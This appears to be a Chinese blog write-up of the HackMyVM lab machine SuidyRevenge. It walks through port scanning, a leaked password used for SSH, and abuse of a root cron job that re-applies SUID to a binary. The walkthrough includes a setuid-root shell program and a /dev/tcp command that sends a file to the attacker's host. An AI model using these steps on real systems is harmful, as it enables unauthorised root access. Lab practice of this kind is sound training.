<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="HMV-SuidyRevenge靶机复盘">
<meta property="og:type" content="article">
<meta property="og:title" content="HMV-SuidyRevenge">
<meta property="og:url" content="https://guayu-kakeru.github.io/posts/23894.html">
<meta property="og:site_name" content="guayu-kakeru">
<meta property="og:description" content="HMV-SuidyRevenge靶机复盘">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67c70bebd0e0a243d40be657.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67c70c60d0e0a243d40be67e.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67c70ca1d0e0a243d40be681.png">
<meta property="article:published_time" content="2025-03-04T13:17:37.000Z">
<meta property="article:modified_time" content="2025-03-04T15:01:49.613Z">
<meta property="article:author" content="guayu-kakeru">
<meta property="article:tag" content="渗透">
<meta property="article:tag" content="HMV">
<meta property="article:tag" content="靶场">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67c70bebd0e0a243d40be657.png">

<link rel="canonical" href="https://guayu-kakeru.github.io/posts/23894.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>HMV-SuidyRevenge | guayu-kakeru</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">guayu-kakeru</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">12</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">68</span></a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/23894.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="guayu-kakeru">
      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="guayu-kakeru">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HMV-SuidyRevenge
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-03-04 21:17:37 / 修改时间：23:01:49" itemprop="dateCreated datePublished" datetime="2025-03-04T21:17:37+08:00">2025-03-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9D%B6%E5%9C%BA/hmv/" itemprop="url" rel="index"><span itemprop="name">hmv</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
      
        <div class="out-img-topic">
          <img src="https://pic1.imgdb.cn/item/67c6fdf8d0e0a243d40be26f.png" class="img-topic">
        </div>
      
      
        <p>HMV-SuidyRevenge靶机复盘  </p>
<span id="more"></span>

<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nmap 192.168.58.83            </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2025</span><span class="number">-03</span><span class="number">-04</span> <span class="number">21</span>:<span class="number">22</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span><span class="number">.58</span><span class="number">.83</span>)</span><br><span class="line">Host is up (<span class="number">0.00056</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span></span><br><span class="line">MAC Address: F2:<span class="number">89</span>:<span class="number">91</span>:<span class="number">6</span>B:<span class="number">3</span>E:<span class="number">9</span>D (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.30</span> <span class="built_in">seconds</span></span><br></pre></td></tr></table></figure></div>
<p>常规的端口，直接去web里面看看。</p>
<h1 id="web探测1"><a href="#web探测1" class="headerlink" title="web探测1"></a>web探测1</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># curl 192.168.58.83             </span></span><br><span class="line">Im proud <span class="keyword">to</span> announce <span class="keyword">that</span> <span class="string">&quot;theuser&quot;</span> <span class="keyword">is</span> <span class="keyword">not</span> anymore <span class="keyword">in</span> our servers.</span><br><span class="line">Our admin <span class="string">&quot;mudra&quot;</span> <span class="keyword">is</span> <span class="keyword">the</span> best admin <span class="keyword">of</span> <span class="keyword">the</span> world.</span><br><span class="line">-suidy</span><br><span class="line"></span><br><span class="line">&lt;!<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;mudra&quot;</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">the</span> best admin, IM IN!!!!</span><br><span class="line">He only changed <span class="keyword">my</span> password <span class="keyword">to</span> a different <span class="keyword">but</span> I had <span class="built_in">time</span></span><br><span class="line"><span class="keyword">to</span> <span class="keyword">put</span> <span class="number">2</span> backdoors (.php) <span class="keyword">from</span> <span class="keyword">my</span> KALI <span class="keyword">into</span> /supersecure <span class="keyword">to</span> keep <span class="keyword">the</span> access!</span><br><span class="line"></span><br><span class="line">-theuser</span><br><span class="line"></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这里给出了很多用户名，而且给出了一个类似于用户凭据的东西<code>theuser/different</code> 我先试试</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ssh theuser@<span class="number">192.168</span>.<span class="number">58.83</span></span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.58.83 (192.168.58.83)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:C2ARiZ0bIPPaLPinl6orW4V74Oo6OBUH2j0JSGrwcu8.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;192.168.58.83&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">theuser@<span class="number">192.168</span>.<span class="number">58.83</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Linux suidyrevenge <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">9</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4.19</span>.<span class="number">118</span>-<span class="number">2</span>+deb10u1 (<span class="number">2020</span>-<span class="number">06</span>-<span class="number">07</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Fri Oct  <span class="number">2</span> <span class="number">09</span>:<span class="number">19</span>:<span class="number">02</span> <span class="number">2020</span> <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">1.58</span></span><br><span class="line">theuser@suidyrevenge:~$ id</span><br><span class="line">uid=<span class="number">1004</span>(theuser) gid=<span class="number">1004</span>(theuser) groups=<span class="number">1004</span>(theuser)</span><br></pre></td></tr></table></figure></div>
<p>发现真的可以登录</p>
<h1 id="提权1"><a href="#提权1" class="headerlink" title="提权1"></a>提权1</h1><p>即然登录进来那就看看有没有什么东西吧<br>没有sudo，有suid</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">theuser<span class="variable">@suidyrevenge</span>:~<span class="variable">$ </span>sudo -l</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the local System</span><br><span class="line">Administrator. It usually boils down to these three <span class="symbol">things:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">theuser:</span> </span><br><span class="line">Sorry, user theuser may not run sudo on suidyrevenge.</span><br><span class="line">theuser<span class="variable">@suidyrevenge</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/home/suidy</span><span class="regexp">/suidyyyyy</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/eject</span><span class="regexp">/dmcrypt-get-device</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/openssh</span><span class="regexp">/ssh-keysign</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/dbus</span>-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/umount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/sudo</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/mount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/violent</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br></pre></td></tr></table></figure></div>
<p>这里在suidy用户目录下面有一个suid文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">theuser@suidyrevenge:/home/suidy$ ls -al</span><br><span class="line">total 52</span><br><span class="line">drwxrwxr-x<span class="number"> 3 </span>suidy suidy   <span class="number"> 4096 </span>Oct <span class="number"> 2 </span><span class="number"> 2020 </span>.</span><br><span class="line">drwxr-xr-x<span class="number"> 8 </span>root  root    <span class="number"> 4096 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>..</span><br><span class="line">-rw-------<span class="number"> 1 </span>suidy suidy     <span class="number"> 25 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bash_history</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy    <span class="number"> 220 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bash_logout</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy   <span class="number"> 3526 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bashrc</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>suidy suidy   <span class="number"> 4096 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.local</span><br><span class="line">-rw-r-----<span class="number"> 1 </span>suidy suidy    <span class="number"> 262 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>note.txt</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy    <span class="number"> 807 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.profile</span><br><span class="line">-rwsrws---<span class="number"> 1 </span>root  theuser<span class="number"> 16712 </span>Oct <span class="number"> 2 </span><span class="number"> 2020 </span>suidyyyyy</span><br><span class="line">theuser@suidyrevenge:/home/suidy$ file suidyyyyy </span><br><span class="line">suidyyyyy: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version<span class="number"> 1 </span>(SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=863d91411490dee69e751d36cbdc3b45b593f459, not stripped</span><br><span class="line">theuser@suidyrevenge:/home/suidy$ ./suidyyyyy </span><br><span class="line">suidy@suidyrevenge:/home/suidy$ id</span><br><span class="line">uid=1005(suidy) gid=1004(theuser) groups=1004(theuser)</span><br></pre></td></tr></table></figure></div>
<p>这是一个可执行文件,执行之后发现拿到suidy的用户了。把这个文件拿到本地看看是做了什么事</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nc -lp 1234 &gt; suidy</span></span><br><span class="line">                           </span><br><span class="line">suidy<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cat suidyyyyy  &gt; /dev/tcp/<span class="number">192.168</span>.<span class="number">58.11</span>/<span class="number">1234</span></span><br></pre></td></tr></table></figure></div>

<p>在ida里面看，发现就是一个设置suid然后拿到shell的程序</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setuid</span>(<span class="number">0x3EDu</span>);</span><br><span class="line">  <span class="built_in">setgid</span>(<span class="number">0x3EDu</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这个suidy目录下面还有一个note</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">suidy<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>ls</span><br><span class="line">note.txt  suidyyyyy</span><br><span class="line">suidy<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cat note.txt</span><br><span class="line">I know that theuser is <span class="keyword">not</span> here anymore but suidyyyyy is now more secure!</span><br><span class="line">root runs the script as <span class="keyword">in</span> the past that always gives <span class="title class_">SUID</span> to suidyyyyy binary</span><br><span class="line">but this time also check the size of the file.</span><br><span class="line"><span class="title class_">WE</span> <span class="title class_">DONT</span> <span class="title class_">WANT</span> <span class="title class_">MORE</span> <span class="string">&quot;theuser&quot;</span> <span class="title class_">HERE</span>!.</span><br><span class="line"><span class="title class_">WE</span> <span class="title class_">ARE</span> <span class="title class_">SECURE</span> <span class="title class_">NOW</span>.</span><br><span class="line"></span><br><span class="line">-suidy</span><br></pre></td></tr></table></figure></div>
<p>这里说suidyyyyy总是有suid权限，还说道了检查file的size<br>那根据这个提示，肯定就是要对这个有suid的程序做手脚了，而且这个程序还是属于theuser组，有rws权限<br>因为这个文件的属组是theuser，我就先用了theuser用户写一个c文件，但是这个文件的目录是suidy的，theuser没有写入权限<br>那现在我也写一个得到bash的文件，设置uid和gid是0 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">suidy@suidyrevenge:/home/suidy$ ls -al</span><br><span class="line">total 76</span><br><span class="line">drwxrwxr-x<span class="number"> 3 </span>suidy suidy   <span class="number"> 4096 </span>Mar <span class="number"> 4 </span>08:54 .</span><br><span class="line">drwxr-xr-x<span class="number"> 8 </span>root  root    <span class="number"> 4096 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>..</span><br><span class="line">-rw-------<span class="number"> 1 </span>suidy suidy     <span class="number"> 25 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bash_history</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy    <span class="number"> 220 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bash_logout</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy   <span class="number"> 3526 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bashrc</span><br><span class="line">-rwxr-xr-x<span class="number"> 1 </span>suidy theuser<span class="number"> 16712 </span>Mar <span class="number"> 4 </span>08:54 hack</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>suidy theuser   <span class="number"> 97 </span>Mar <span class="number"> 4 </span>08:54 hack.c</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>suidy suidy   <span class="number"> 4096 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.local</span><br><span class="line">-rw-r-----<span class="number"> 1 </span>suidy suidy    <span class="number"> 262 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>note.txt</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy    <span class="number"> 807 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.profile</span><br><span class="line">-rwsrws---<span class="number"> 1 </span>root  theuser<span class="number"> 16712 </span>Oct <span class="number"> 2 </span><span class="number"> 2020 </span>suidyyyyy</span><br><span class="line">suidy@suidyrevenge:/home/suidy$ cat hack.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">  setuid(0);</span><br><span class="line">  setgid(0);</span><br><span class="line">  system(&quot;/bin/bash&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>刚才提示我们说大小，发现这个大小也是刚好一样的，看来就没有什么问题<br>但是这里我用cp命令，发现说这个suidyyyyy busy，是因为我们这个bash就是运行这个程序得到的，那我们又不知道suidy的密码，所以就直接删除这个文件吧<br>过了一会发现这个suidyyyyy程序又出现了，估计就是一个定时任务</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">theuser<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>ls</span><br><span class="line">hack  hack.c  note.txt  suidyyyyy</span><br><span class="line">theuser<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cp /home/suidy/hack /home/suidy/suidyyyyy </span><br><span class="line">theuser<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>./suidyyyyy </span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">theuser<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>./suidyyyyy </span><br><span class="line">root<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">1004</span>(theuser)</span><br></pre></td></tr></table></figure></div>
<p>发现成功了，但是为什么这个是个hard靶机呢。这样下来一看也就是个easy。翻了一下wp，发现原来这里web有第二种方式拿到www用户然后提权</p>
